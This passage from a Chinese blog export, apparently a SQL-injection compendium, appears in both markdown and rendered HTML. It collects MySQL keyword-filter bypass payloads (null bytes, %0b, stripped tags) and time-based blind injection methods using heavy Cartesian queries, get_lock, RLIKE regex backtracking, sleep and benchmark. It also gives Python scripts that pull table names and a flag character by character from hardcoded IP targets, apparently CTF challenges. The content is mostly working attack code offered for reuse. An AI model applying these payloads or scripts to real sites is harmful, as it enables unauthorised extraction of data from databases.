建立的连接）。\n简单来说，即\nmysql_connect()使用后立刻就会断开\n而\nmysql_pconnect()会保持连接，并不会立刻断开\n```\n\n所以:\n\n我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源`skysec.top`加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了`mysql_connect()`，那么get_lock的方法将不适用 而`mysql_pconnect()`建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2\n\n cmd1:\n\n```\nmysql> select * from content where id = 1 and get_lock('skysec.top',1);\n+----+-------------------------------------+\n| id | content                             |\n+----+-------------------------------------+\n|  1 | I think you may need sql injection! |\n+----+-------------------------------------+\n1 row in set (0.00 sec)\n```\n\ncmd2:\n\n```\nmysql> select * from content where id =1 and 1 and get_lock('skysec.top',5);\nEmpty set (5.00 sec)\n\nmysql> select * from content where id =1 and 0 and get_lock('skysec.top',5);\nEmpty set (0.00 sec)\n```\n\n脚本如下:\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport time\nurl1 = \"http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23\"\nr = requests.get(url=url1)\ntime.sleep(90)\n# 加锁后变换身份\nurl2 = \"http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23\"\ndata = \"\"\nfor i in range(1,1000):\n    print i\n    for j in range(33,127):\n        #payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post\n        payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags\n        #payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag\n        #payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)\n        payload_url = url2%(payload)\n        try:\n            s = requests.get(url=payload_url,timeout=4.5)\n        except:\n            data +=chr(j)\n            print data\n            break\n```\n\n总结:\n\n必须使用长连接，即使用mysql_pconnect()\n\n构造被加锁的数据\n\n1.以客户A的身份,对资源skysec.top进行加锁 \n\n2.等待90s，让服务器将我们下一次的查询当做客户B \n\n3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 \n\n## Rlike\n\n正则表达式\n\n```\nconcat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'\n```\n\n以上代码等同于sleep(5)\n\n ```\nmysql> select * from content where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (4.24 sec)\n\nmysql> select * from content where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';\nEmpty set (0.00 sec)\n ```\n\n## sleep\n\n```\nmysql> select sleep(5);\n+----------+\n| sleep(5) |\n+----------+\n|        0 |\n+----------+\n1 row in set (5.00 sec)\n```\n\nBENCHMARK\n\n```\nmysql> select benchmark(10000000,sha(1));\n+----------------------------+\n| benchmark(10000000,sha(1)) |\n+----------------------------+\n|                          0 |\n+----------------------------+\n1 row in set (2.79 sec)\n```\n\n\n\n\n\n\n\n","slug":"sql注入大全","published":1,"updated":"2018-06-04T01:39:03.212Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12id001kqkdlmj2b68wb","content":"<ul>\n<li><p>表名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select group_concat(distinct table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>列名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>数据库</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>表内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 1,concat(user, 0x2c, password) from [table_name]</span><br></pre></td></tr></table></figure>\n<p>​</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">优先级 运算符</span><br><span class=\"line\">(最高)  !</span><br><span class=\"line\">    -（负号）,~（按位取反）</span><br><span class=\"line\">    ^（按位异或）</span><br><span class=\"line\">    *,/(DIV),%(MOD)</span><br><span class=\"line\">    +,-</span><br><span class=\"line\">    &gt;&gt;,&lt;&lt;</span><br><span class=\"line\">    &amp;</span><br><span class=\"line\">    |</span><br><span class=\"line\">    =(比较运算),&lt;=&gt;,&lt;,&lt;=,&gt;,&gt;=,!=,&lt;&gt;,IN,IS NULL,LIKE,REGEXP</span><br><span class=\"line\">   BETWEEN AND,CASE,WHEN,THEN,ELSE</span><br><span class=\"line\">   NOT</span><br><span class=\"line\">   &amp;&amp;,AND</span><br><span class=\"line\">   XOR</span><br><span class=\"line\">   ||,OR</span><br><span class=\"line\">(最低)    =(赋值运算),:=</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"union-select-不允许同时出现\"><a href=\"#union-select-不允许同时出现\" class=\"headerlink\" title=\"union select 不允许同时出现\"></a>union select 不允许同时出现</h1><p>过滤正则表达式如下:<br><code><br>union[\\s\\xA0]+select<br></code><br><br>可以使用union all select绕过</p>\n<h1 id=\"select过滤\"><a href=\"#select过滤\" class=\"headerlink\" title=\"select过滤\"></a>select过滤</h1><p>se%00lect绕过</p>\n<h1 id=\"–-注释\"><a href=\"#–-注释\" class=\"headerlink\" title=\"– 注释\"></a>– 注释</h1><p>–后边不允许添加任何空白字符<br>过滤正则表达式如下:<br>–[\\s\\xA0]<br>还可以使用%1a<br>–%1a绕过</p>\n<h1 id=\"where后边跟着sleep函数\"><a href=\"#where后边跟着sleep函数\" class=\"headerlink\" title=\"where后边跟着sleep函数\"></a>where后边跟着sleep函数</h1><p><code>select * from table_name where sleep(2) or 1 = 2;</code></p>\n<p>如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回<br>如果1=1，则会立即返回所有数据</p>\n<p>@<code>&#39;</code> 相当于 NULL</p>\n<p>select group_concat(ip)’’ from client_ip;</p>\n<h1 id=\"DNSlog盲注\"><a href=\"#DNSlog盲注\" class=\"headerlink\" title=\"DNSlog盲注\"></a>DNSlog盲注</h1><p>DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>\n<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>\n<p>2、当secure_file_priv为G:\\，就可以读取G盘的文件。</p>\n<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>\n<p>sleep 不能填数字，可以使用pi()替代</p>\n<p>各种payload:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from antisqli where `id`=&apos;\\&apos; and `pw`=md5(&apos; union select 1,2,3--&apos;)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">644400 union select &apos;z1&apos;,flag,&apos;z3&apos;,&apos;z4&apos; from flag order by password desc#</span><br></pre></td></tr></table></figure>\n<p>关键词union,select,from被过滤，可以考虑%00绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//过滤sql</span><br><span class=\"line\">$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);</span><br><span class=\"line\">foreach ($array as $value)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (substr_count($id, $value) &gt; 0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\texit(&apos;包含敏感关键字！&apos;.$value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//xss过滤</span><br><span class=\"line\">$id = strip_tags($id);</span><br><span class=\"line\"></span><br><span class=\"line\">$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;;</span><br><span class=\"line\">payload:</span><br><span class=\"line\">http://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#</span><br><span class=\"line\">由于strip_tags 将&lt;&gt;替换为空，所以可以使用&lt;&gt;绕过：</span><br><span class=\"line\">http://103.238.227.13:10087/?id=2 unio&lt;&gt;n se&lt;&gt;lect hash,2 fro%00m sql3.key#</span><br></pre></td></tr></table></figure>\n<p>某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。<br>id=1+uni%0bon+se%0blect+1,2,3–</p>\n<h1 id=\"Mysql大小写不敏感，绕过检测\"><a href=\"#Mysql大小写不敏感，绕过检测\" class=\"headerlink\" title=\"Mysql大小写不敏感，绕过检测\"></a>Mysql大小写不敏感，绕过检测</h1><h1 id=\"heavy-query\"><a href=\"#heavy-query\" class=\"headerlink\" title=\"heavy query\"></a>heavy query</h1><p><a href=\"http://www.360zhijia.com/anquan/369098.html\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"笛卡尔积运算\"><a href=\"#笛卡尔积运算\" class=\"headerlink\" title=\"笛卡尔积运算\"></a>笛卡尔积运算</h2><blockquote>\n<p>select <em> from content where id = 1 and 1 and (SELECT count(</em>) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23\"</span></span><br><span class=\"line\">data = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">1000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\" % (i, j) #article,flags</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag</span></span><br><span class=\"line\">        payload = <span class=\"string\">\"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\"</span> % (i, j)</span><br><span class=\"line\">        payload_url = url%(payload)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            r = requests.get(url=payload_url,timeout=<span class=\"number\">8</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            data +=chr(j)</span><br><span class=\"line\">            <span class=\"keyword\">print</span> data</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Get-lock\"><a href=\"#Get-lock\" class=\"headerlink\" title=\"Get_lock\"></a>Get_lock</h2><p>get_lock是mysql的锁机制</p>\n<ul>\n<li>get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。</li>\n<li>当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来</li>\n</ul>\n<p>打开两个cmd</p>\n<p>cmd1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,1);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,1) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        1 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,5) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        0 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,2);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,2) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        0 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (2.00 sec)</span><br></pre></td></tr></table></figure>\n<p>关闭cmd1,cmd2执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">| get_lock(&apos;skysec.top&apos;,5) |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">|                        1 |</span><br><span class=\"line\">+--------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是<code>mysql_connect</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql_connect() 脚本一结束，到服务器的连接就被关闭</span><br><span class=\"line\">mysql_pconnect() 打开一个到 MySQL 服务器的持久连接</span><br></pre></td></tr></table></figure>\n<p>官方描述：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。</span><br><span class=\"line\">首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。</span><br><span class=\"line\">其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。</span><br><span class=\"line\">简单来说，即</span><br><span class=\"line\">mysql_connect()使用后立刻就会断开</span><br><span class=\"line\">而</span><br><span class=\"line\">mysql_pconnect()会保持连接，并不会立刻断开</span><br></pre></td></tr></table></figure>\n<p>所以:</p>\n<p>我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源<code>skysec.top</code>加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了<code>mysql_connect()</code>，那么get_lock的方法将不适用 而<code>mysql_pconnect()</code>建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2</p>\n<p> cmd1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from content where id = 1 and get_lock(&apos;skysec.top&apos;,1);</span><br><span class=\"line\">+----+-------------------------------------+</span><br><span class=\"line\">| id | content                             |</span><br><span class=\"line\">+----+-------------------------------------+</span><br><span class=\"line\">|  1 | I think you may need sql injection! |</span><br><span class=\"line\">+----+-------------------------------------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>cmd2:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from content where id =1 and 1 and get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">Empty set (5.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from content where id =1 and 0 and get_lock(&apos;skysec.top&apos;,5);</span><br><span class=\"line\">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<p>脚本如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">url1 = <span class=\"string\">\"http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23\"</span></span><br><span class=\"line\">r = requests.get(url=url1)</span><br><span class=\"line\">time.sleep(<span class=\"number\">90</span>)</span><br><span class=\"line\"><span class=\"comment\"># 加锁后变换身份</span></span><br><span class=\"line\">url2 = <span class=\"string\">\"http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23\"</span></span><br><span class=\"line\">data = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">1000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">print</span> i</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>,<span class=\"number\">127</span>):</span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((database()),%s,1))=%s)\"%(i,j) #post</span></span><br><span class=\"line\">        payload = <span class=\"string\">\"(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)\"</span> % (i, j) <span class=\"comment\">#article,flags</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)\" % (i, j) #flag</span></span><br><span class=\"line\">        <span class=\"comment\">#payload = \"(ascii(substr((select flag from flags limit 1),%s,1))=%s)\" % (i, j)</span></span><br><span class=\"line\">        payload_url = url2%(payload)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            s = requests.get(url=payload_url,timeout=<span class=\"number\">4.5</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            data +=chr(j)</span><br><span class=\"line\">            <span class=\"keyword\">print</span> data</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>总结:</p>\n<p>必须使用长连接，即使用mysql_pconnect()</p>\n<p>构造被加锁的数据</p>\n<p>1.以客户A的身份,对资源skysec.top进行加锁 </p>\n<p>2.等待90s，让服务器将我们下一次的查询当做客户B </p>\n<p>3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 </p>\n<h2 id=\"Rlike\"><a href=\"#Rlike\" class=\"headerlink\" title=\"Rlike\"></a>Rlike</h2><p>正则表达式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;</span><br></pre></td></tr></table></figure>\n<p>以上代码等同于sleep(5)</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from content where id =1 and IF(1,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;</span><br><span class=\"line\">Empty set (4.24 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;),rpad(1,999999,&apos;a&apos;)) RLIKE &apos;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&apos;,0) and &apos;1&apos;=&apos;1&apos;;</span><br><span class=\"line\">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>\n<h2 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"sleep\"></a>sleep</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select sleep(5);</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">| sleep(5) |</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">|        0 |</span><br><span class=\"line\">+----------+</span><br><span class=\"line\">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure>\n<p>BENCHMARK</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span 